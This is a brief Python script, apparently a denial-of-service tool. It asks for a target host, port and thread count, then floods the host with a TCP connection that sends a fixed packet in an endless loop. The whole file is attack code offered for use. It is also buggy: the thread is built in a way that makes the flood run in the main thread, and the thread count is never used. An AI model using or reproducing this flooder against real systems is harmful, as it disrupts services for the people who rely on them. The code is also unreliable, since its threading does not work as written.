import socket
import threading

def tmp():
    print("coming...\n")
def send(host,port):
    packet="test".encode()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    while(True):
        s.send(packet)

def main():
    print("Executing Dos Script\n")
    Host=str(input("Please enter the Hostname\n"))
    Port=int(input("Please enter the Port\n"))
    thread_c=int(input("How many threads do u want to start?\n"))
    x=threading.Thread(target=send(Host,Port),args=(1,))
    x.start()


if __name__=="__main__":
    main()